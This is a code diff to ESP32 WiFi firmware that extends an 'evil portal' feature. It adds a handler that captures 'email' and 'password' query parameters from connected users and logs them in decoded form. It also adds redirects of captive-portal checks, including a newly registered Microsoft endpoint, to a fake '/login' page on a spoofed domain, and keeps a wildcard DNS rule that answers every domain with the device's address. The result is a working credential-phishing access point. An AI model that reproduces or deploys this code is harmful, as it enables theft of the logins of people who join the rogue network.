@@ -29,6 +29,7 @@ uint16_t ap_count;
 wifi_ap_record_t* scanned_aps;
 const char *TAG = "WiFiManager";
 char* PORTALURL = "";
+char* DOMAIN = "";
 EventGroupHandle_t wifi_event_group;
 const int WIFI_CONNECTED_BIT = BIT0;
 wifi_ap_record_t selected_ap;
@@ -302,24 +303,24 @@ void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type)
 esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *content_type) {
     ESP_LOGI(TAG, "Requesting URL: %s", url);
 
-    // HTTPS client configuration with automatic redirect handling enabled
+    
     esp_http_client_config_t config = {
         .url = url,
-        .timeout_ms = 5000,  // Set 5 seconds timeout
-        .crt_bundle_attach = esp_crt_bundle_attach,  // Certificate validation
+        .timeout_ms = 5000,
+        .crt_bundle_attach = esp_crt_bundle_attach,
         .transport_type = HTTP_TRANSPORT_OVER_SSL,
         .user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",  // Browser-like User-Agent string
-        .disable_auto_redirect = false,  // Automatic redirection is enabled
+        .disable_auto_redirect = false,
     };
 
-    // Initialize the HTTP client
+    
     esp_http_client_handle_t client = esp_http_client_init(&config);
     if (client == NULL) {
         ESP_LOGE(TAG, "Failed to initialize HTTP client");
         return ESP_FAIL;
     }
 
-    // Perform the HTTP request (this will handle redirects automatically)
+    
     esp_err_t err = esp_http_client_perform(client);
     if (err != ESP_OK) {
         ESP_LOGE(TAG, "HTTP request failed: %s", esp_err_to_name(err));
@@ -327,27 +328,27 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
         return ESP_FAIL;
     }
 
-    // Get the final status code after any redirects
+    
     int http_status = esp_http_client_get_status_code(client);
     ESP_LOGI(TAG, "Final HTTP Status code: %d", http_status);
 
-    // Handle 200 OK: Now we need to re-open the connection and stream content manually
+   
     if (http_status == 200) {
         ESP_LOGI(TAG, "Received 200 OK. Re-opening connection for manual streaming...");
 
-        // Re-open the connection (we will now manually stream the content)
-        err = esp_http_client_open(client, 0);  // 0 means we're just reading the data
+        
+        err = esp_http_client_open(client, 0);
         if (err != ESP_OK) {
             ESP_LOGE(TAG, "Failed to re-open HTTP connection for streaming: %s", esp_err_to_name(err));
             esp_http_client_cleanup(client);
             return ESP_FAIL;
         }
 
-        // Fetch headers again to get the content length (optional, depending on your needs)
+
         int content_length = esp_http_client_fetch_headers(client);
         ESP_LOGI(TAG, "Content length: %d", content_length);
 
-        // Set the content type for the response
+        
         if (content_type) {
             ESP_LOGI(TAG, "Content-Type: %s", content_type);
             httpd_resp_set_type(req, content_type);
@@ -357,38 +358,38 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
         }
         httpd_resp_set_status(req, "200 OK");
 
-        // Allocate buffer for streaming
-        char *buffer = (char *)malloc(CHUNK_SIZE + 1);  // +1 for null termination
+        
+        char *buffer = (char *)malloc(CHUNK_SIZE + 1);
         if (buffer == NULL) {
             ESP_LOGE(TAG, "Failed to allocate memory for buffer");
             esp_http_client_cleanup(client);
             return ESP_FAIL;
         }
 
-        // Read and stream the content chunk by chunk
+
         int read_len;
         while ((read_len = esp_http_client_read(client, buffer, CHUNK_SIZE)) > 0) {
-            // Send the chunk to the HTTP server
+            
             if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
                 ESP_LOGE(TAG, "Failed to send chunk to client");
                 break;
             }
         }
 
-        // Check if reading ended properly
+        
         if (read_len == 0) {
             ESP_LOGI(TAG, "Finished reading all data from server (end of content)");
         } else if (read_len < 0) {
             ESP_LOGE(TAG, "Failed to read response, read_len: %d", read_len);
         }
 
-        // Free the buffer and close the connection
+        
         free(buffer);
         esp_http_client_close(client);
         esp_http_client_cleanup(client);
 
-        // Send the last chunk indicating the end of the response
-        httpd_resp_send_chunk(req, NULL, 0);  // NULL, 0 marks the end of the chunked response
+        
+        httpd_resp_send_chunk(req, NULL, 0);
 
         return ESP_OK;
 
@@ -484,12 +485,64 @@ esp_err_t portal_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 
+esp_err_t get_info_handler(httpd_req_t *req) {
+    char query[256] = {0};
+    char email[64] = {0};
+    char password[64] = {0};
+
+    
+    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
+        ESP_LOGI("QUERY", "Received query: %s", query);
+
+
+        if (get_query_param_value(query, "email", email, sizeof(email)) == ESP_OK) {
+            char decoded_email[64] = {0};
+            url_decode(decoded_email, email);
+            ESP_LOGI("QUERY", "Decoded email: %s", decoded_email);
+        } else {
+            ESP_LOGW("QUERY", "Email parameter not found");
+        }
+
+        
+        if (get_query_param_value(query, "password", password, sizeof(password)) == ESP_OK) {
+            char decoded_password[64] = {0};
+            url_decode(decoded_password, password);
+            ESP_LOGI("QUERY", "Decoded password: %s", decoded_password);
+        } else {
+            ESP_LOGW("QUERY", "Password parameter not found");
+        }
+
+    } else {
+        ESP_LOGW("QUERY", "No query string found in request");
+    }
+
+    
+    const char* resp_str = "Query parameters processed";
+    httpd_resp_send(req, resp_str, strlen(resp_str));
+
+    return ESP_OK;
+}
+
 esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     ESP_LOGI(TAG, "Received request for captive portal detection endpoint: %s", req->uri);
 
+    if (strstr(req->uri, "/get") != NULL) {
+        get_info_handler(req);
+        return ESP_OK;
+    }
+
+
+    if (strstr(get_content_type(req->uri), "application/octet-stream") == NULL)
+    {
+        file_handler(req);
+        return ESP_OK;
+    }
     
     httpd_resp_set_status(req, "301 Moved Permanently");
-    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/portal.html");
+    char LocationRedir[512];
+        snprintf(LocationRedir, sizeof(LocationRedir),
+                 "http://%s.local/login", DOMAIN);
+    httpd_resp_set_hdr(req, "Location", LocationRedir);
     httpd_resp_send(req, NULL, 0);
     return ESP_OK;
 }
@@ -500,7 +553,7 @@ httpd_handle_t start_portal_webserver(void) {
     httpd_handle_t server = NULL;
     if (httpd_start(&server, &config) == ESP_OK) {
         httpd_uri_t portal_uri = {
-            .uri      = "/portal.html",
+            .uri      = "/login",
             .method   = HTTP_GET,
             .handler  = portal_handler,
             .user_ctx = NULL
@@ -550,6 +603,7 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_register_uri_handler(server, &portal_uri_apple);
         httpd_register_uri_handler(server, &portal_uri);
         httpd_register_uri_handler(server, &portal_uri_android);
+        httpd_register_uri_handler(server, &microsoft_uri);
 
 
         httpd_register_uri_handler(server, &portal_png);
@@ -561,12 +615,13 @@ httpd_handle_t start_portal_webserver(void) {
     return server;
 }
 
-void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const char *Password, const char* ap_ssid)
+void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const char *Password, const char* ap_ssid, const char* domain)
 {
 
-    if (strlen(URL) > 0)
+    if (strlen(URL) > 0 && strlen(domain) > 0)
     {
         PORTALURL = URL;
+        DOMAIN = domain;
     }
 
     ap_manager_stop_services();
@@ -625,10 +680,13 @@ void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const cha
     start_portal_webserver();
 
     dns_server_config_t dns_config = {
-        .num_of_entries = 1, // Only one rule that matches all domain requests
+        .num_of_entries = 1,
         .item = {
-            // Respond to all queries ("*") with the IP address 192.168.4.1
-            { .name = "*", .if_key = NULL, .ip = { .addr = ESP_IP4TOADDR(192, 168, 4, 1) } }
+            {
+                .name = "*", 
+                .if_key = NULL, 
+                .ip = { .addr = ESP_IP4TOADDR(192, 168, 4, 1)} 
+            }
         }
     };
 
